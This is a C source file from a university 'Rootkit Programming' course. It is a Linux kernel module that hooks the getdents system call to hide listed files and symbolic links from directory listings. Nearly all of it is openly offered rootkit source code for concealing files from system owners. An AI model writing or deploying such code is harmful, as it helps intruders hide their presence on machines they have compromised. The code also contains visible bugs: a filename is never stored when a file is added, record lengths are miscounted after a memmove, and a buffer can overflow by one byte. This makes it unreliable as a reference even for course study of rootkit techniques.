
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 4                                                             */
/*                                                                             */
/*   Filename: file_masker.c                                                */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: November 2015                                                       */
/*                                                                             */
/*   Usage: insmod $(module_name).ko                                           */
/*                                                                             */
/*******************************************************************************/

#include <linux/module.h>		/* Needed by all kernel modules */
#include <linux/syscalls.h>		/* Needed for __NR_getdents */
#include <linux/namei.h>		/* Needed for kern_path & LOOKUP_FOLLOW */
#include <linux/ctype.h>
#include <linux/fs.h>
#include <linux/list.h>
#include <linux/slab.h>

#include "file_masker.h"
#include "sysmap.h"				/* Needed for ROOTKIT_SYS_CALL_TABLE */

#define NAME_BUF_SIZE 200

MODULE_LICENSE("GPL");

asmlinkage int (*getdents_syscall)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage long (*readlinkat_syscall)(int dfd, const char __user *path,
				 char __user *buf, int bufsiz);

struct hfile {
	char *filename;
	struct list_head list;
};
LIST_HEAD(names);

void hide_file(char *filename)
{
	struct hfile *new_file = kzalloc(sizeof(struct hfile), GFP_KERNEL);
	list_add(&(new_file->list), &names);
}

void reveal_file(char *filename)
{
	struct hfile *f = NULL;

	list_for_each_entry(f, &names, list)
		if (strcmp(filename, f->filename) == 0) {
			list_del(&f->list);
			break;
		}
}

/* Function that replaces the original getdents syscall. In addition to what
   getdents does, additionally it ...  */
asmlinkage int my_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
	int nread;
	int nread_temp;
	char name[NAME_BUF_SIZE];
	int size = 0;

	/* Call original getdents_syscall */
	nread = getdents_syscall(fd, dirp, count);

	nread_temp = nread;

	while (nread_temp > 0) {
		nread_temp -= dirp->d_reclen;
		size = 0;

		set_fs(KERNEL_DS);
		size = readlinkat_syscall(fd, dirp->d_name, name, NAME_BUF_SIZE);
		set_fs(USER_DS);

		if (size > 0)
			name[size] = '\0';

		if (should_mask(dirp->d_name) || (size > 0 && should_mask(name))) {
			if (size > 0)
				printk(KERN_INFO "file_masker rootkit: hiding link %s which points to file %s\n", dirp->d_name, name);
			else
				printk(KERN_INFO "file_masker rootkit: hiding file %s\n", dirp->d_name);
			memmove(dirp, (char *) dirp + dirp->d_reclen, nread_temp);
			nread -= dirp->d_reclen;
			continue;
		}

		if (nread_temp == 0)
			return nread;

		dirp = (struct linux_dirent *) ((char *) dirp + dirp->d_reclen);
	}

	return nread;
}

/* Function that checks whether we need to mask the specified pid */
int should_mask(const char *name)
{
	struct hfile *f = NULL;

	list_for_each_entry(f, &names, list)
		if (strcmp(name, f->filename) == 0)
			return 1;

	return 0;
}
